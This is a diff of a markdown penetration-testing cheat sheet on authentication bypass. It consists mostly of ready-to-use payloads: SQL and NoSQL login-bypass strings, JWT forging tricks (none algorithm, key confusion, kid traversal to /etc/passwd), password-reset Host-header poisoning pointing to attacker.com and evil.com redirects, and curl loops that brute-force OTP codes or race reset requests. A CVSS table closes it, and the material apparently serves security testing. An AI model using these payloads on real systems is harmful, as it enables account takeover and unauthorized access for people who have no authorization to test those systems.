@@ -1,110 +1,208 @@
-# Authentication & Authorization Bypass
+# Authentication Bypass: Complete Reference
 
-## OAuth 2.0 Exploitation
+## Login Bypass Techniques
 
-### CSRF in OAuth Flow
-```http
-GET /auth?client_id=app&redirect_uri=https://attacker.com&state=abc&response_type=code
+### SQL/NoSQL Injection
+```sql
+-- SQL: Classic bypass
+' OR 1=1 --
+admin' --
+' OR '1'='1' --
+admin' OR '1'='1
+' UNION SELECT 1,'admin','hash' --
+admin'-- -
+
+-- NoSQL: MongoDB operator injection
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$exists": true}}
+{"$where": "this.password.length > 0"}
 ```
-No `state` parameter (or predictable state) = CSRF. Bind attacker account to victim's session.
 
-### redirect_uri Validation Bypass
-```bash
-# Open redirect in redirect_uri
-https://target.com/auth?redirect_uri=https://evil.com
-# Subdomain confusion
-https://target.com/auth?redirect_uri=https://target.com.evil.com
-# Path traversal
-https://target.com/auth?redirect_uri=https://target.com/../evil.com
-# Fragment bypass (some validators don't check after #)
-https://target.com/auth?redirect_uri=https://target.com/#@evil.com
-```
-
-### OAuth Token Theft via Referer
-Some OAuth providers pass tokens via URL fragment (`#access_token=xxx`). If the page makes requests to third-party origins, the token leaks via `Referer` header.
-
-### PKCE Downgrade
-Some providers support PKCE but do not enforce it. Remove the `code_challenge` parameter → no PKCE → authorization code interception becomes possible.
-
-## JWT Attacks
-
-### None Algorithm
+### JWT Attacks
 ```python
-import jwt
-jwt.encode({"user": "admin"}, key="", algorithm="none")
-```
+# None algorithm
+jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")
 
-### Weak HMAC Secret
-```bash
+# Weak HMAC secret
 hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
-# Or use jwt_tool
-python3 jwt_tool.py -C -d rockyou.txt token
+
+# Algorithm confusion (RS256 -> HS256 with public key)
+public_key = open("public.pem").read()
+jwt.encode({"sub": "admin"}, key=public_key, algorithm="HS256")
+
+# kid path traversal
+{"alg": "HS256", "kid": "../../../dev/null"}  # Empty key
+{"alg": "HS256", "kid": "../../../../etc/passwd"}  # Key = file contents
+{"alg": "HS256", "kid": "file:///proc/sys/kernel/random/uuid"}  # random key
+
+# JWK injection
+# Send a crafted jwk or jku in the JWT header
+# The server uses your provided public key to verify
 ```
 
-### kid Injection (Path Traversal)
-```json
-{
-  "kid": "../../../dev/null",
-  "user": "admin"
-}
-# Key is empty (because /dev/null is empty) → HMAC-SHA256 with empty key
-```
-
-### jku/x5u Header Injection
-The `jku` (JWK Set URL) header can point to an attacker-controlled server:
-```json
-{"jku": "https://evil.com/jwks.json", "user": "admin"}
-```
-Host a JWK Set with your public key and sign arbitrary tokens.
-
-## Session Flaw Exploitation
-
-### Session Fixation
-```http
-GET /login?session_id=attacker_controlled HTTP/1.1
-# If app uses the provided session instead of generating new one after login
-# Attacker knows the session_id and hijacks after victim authenticates
-```
-
-### Session Token Predictability
+### Session Manipulation
 ```bash
-# Collect 100+ session tokens
-# Analyze pattern using Burp Sequencer
-# If tokens are predictable (timestamp-based, MD5 hash), predict and hijack
+# Session fixation
+1. Get session token from server (unauthenticated)
+2. Send login link with that session token to victim
+3. Victim authenticates -> session now has victim's credentials
+
+# Session prediction
+# Analyze token pattern for predictability
+# Common patterns: timestamp+userid, MD5(username), sequential
+# Example: session=1680000000_user1 (predictable)
+
+# Cookie manipulation
+Cookie: session=admin
+Cookie: role=admin
+Cookie: is_admin=true
+Cookie: authenticated=true
+Cookie: access=full
 ```
 
-### Session Not Invalidated on Logout
-```http
-# Login, capture session token
-# Logout
-# Test: is the old session token still valid?
-GET /api/profile Cookie: session=old_token
-# If 200, the app never invalidated the session
+### OAuth Misconfiguration
+```bash
+# CSRF in OAuth flow (account linking)
+1. Create app on victim's OAuth provider
+2. Initiate OAuth flow with victim's account
+3. Intercept and replay authorization code
+4. Link attacker's account to victim's OAuth provider
+
+# Redirect URI manipulation
+https://target.com/oauth/callback?code=CODE
+- Change redirect_uri to attacker-controlled
+- Steal authorization code via redirect
+
+# OpenID Connect token injection
+- Modify sub claim after token is issued
+- Use forged ID token with modified claims
 ```
 
-## 2FA Bypass
+## Password Reset Bypass
 
-### Direct API Call
-```http
-POST /api/login HTTP/1.1
-{"username": "victim", "password": "hacked"}
-{"otp": ""}  # Remove OTP parameter entirely
-{"otp": null}  # Send null OTP
+### Token Prediction
+```bash
+# Predictable token patterns
+- Timestamp-based: 1680000000, 1680000001
+- Sequential: 1000, 1001, 1002
+- Weak hash: MD5(username), SHA1(timestamp)
+- Base64(email): base64("victim@email.com")
+- Short tokens: 4-6 digit numeric
 ```
 
-### Rate Limiting Bypass on OTP
-```http
-# GraphQL batching
-POST /graphql HTTP/1.1
-{"query": "mutation { login(otp: "0000"), login2: login(otp: "0001"), ... }"}
-# IP rotation via X-Forwarded-For
-X-Forwarded-For: 127.0.0.1, 127.0.0.2, 127.0.0.3...
+### Host Header Injection
+```bash
+# Reset link uses Host header to construct URL
+Host: attacker.com
+# Reset email sends link to https://attacker.com/reset?token=TOKEN
+
+# X-Forwarded-Host injection
+X-Forwarded-Host: attacker.com
+X-Forwarded-Proto: http  # Downgrade to HTTP
 ```
 
-### Response Manipulation
-```http
-HTTP/1.1 401 Unauthorized  # Expected
-# Change to:
-HTTP/1.1 200 OK
-# If client-side auth relies on response code, attacker-controlled proxy can modify it
+### Rate Limit / Race Condition
+```bash
+# Send password reset requests in parallel
+# One succeeds, bypassing token invalidation
+for i in {1..100}; do
+  curl -X POST /api/reset -d "email=victim@target.com" &
+done
+
+# Multiple resets for same account
+# Sometimes old token remains valid
 ```
+
+## 2FA/MFA Bypass
+
+### OTP Code Attacks
+```bash
+# Brute force (if no rate limit)
+for i in $(seq -w 000000 999999); do
+  curl -X POST /api/verify-2fa -d "code=$i" &
+done
+
+# Race condition: send same code twice
+curl -X POST /api/verify-2fa -d "code=123456" &
+curl -X POST /api/verify-2fa -d "code=123456" &
+
+# Response manipulation (client-side check)
+{"success": false} -> {"success": true}
+
+# OTP length variation
+# Some apps accept codes of any length
+code=1, code=12, code=123
+```
+
+### Backup Code Abuse
+```bash
+# Backup codes often have predictable patterns
+# Common: 8-digit alphanumeric, often sequential
+# Try: 00000000, 00000001, ABCDEF01
+
+# Backup code reuse
+# Some apps don't invalidate used backup codes
+```
+
+## Cookie Manipulation
+
+### Cookie Force
+```bash
+# Manually set privileged cookies
+curl -b "role=admin" https://target.com/admin
+curl -b "is_admin=1" https://target.com/admin
+curl -b "authenticated=true" https://target.com/admin
+curl -b "access_level=full" https://target.com/admin
+```
+
+### Cookie Decoding
+```bash
+# Base64 decode session cookies
+echo "YWRtaW46dHJ1ZQ==" | base64 -d  # admin:true
+
+# Serialized cookies
+# PHP: Tzo0OiJVc2VyIjoxOntzOjg6InJvbGVfYWRtaW4iO3M6NToiYWRtaW4iO30=
+# Decoded: O:4:"User":1:{s:8:"role_admin";s:5:"admin";}
+
+# JSON cookies
+{"username":"admin","role":"admin"}
+```
+
+## Remember Me Token Manipulation
+```bash
+# Persistent auth cookies often stored with weak hashing
+# Try: MD5(username:password), SHA1(username+secret)
+# Common pattern: base64(userid:token)
+
+# Token manipulation
+# If pattern is base64(user_id:random), try other user IDs
+echo "base64(1:random)" | base64 -d
+echo "base64(2:random)" | base64 -d
+```
+
+## GraphQL Auth Bypass
+```graphql
+# Introspection may reveal authentication requirements
+{ __schema { types { name fields { name type { name } } } } }
+
+# Bypass via alias
+mutation { login(username: "admin", password: "guess") }
+
+# Batch aliases for brute force
+mutation {
+  a: login(username: "admin", password: "0000")
+  b: login(username: "admin", password: "0001")
+  c: login(username: "admin", password: "0002")
+}
+```
+
+### CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| Authentication bypass via SQLi | 9.8 | Network, Low, No auth, All impact |
+| JWT none algorithm | 9.1 | Network, Low, No auth, All impact |
+| Session prediction | 8.1 | Network, High (need to predict), No auth |
+| 2FA bypass via race condition | 6.5 | Network, Low, No auth, Changed scope |
+| Password reset token prediction | 7.5 | Network, High, No auth, Limited impact |
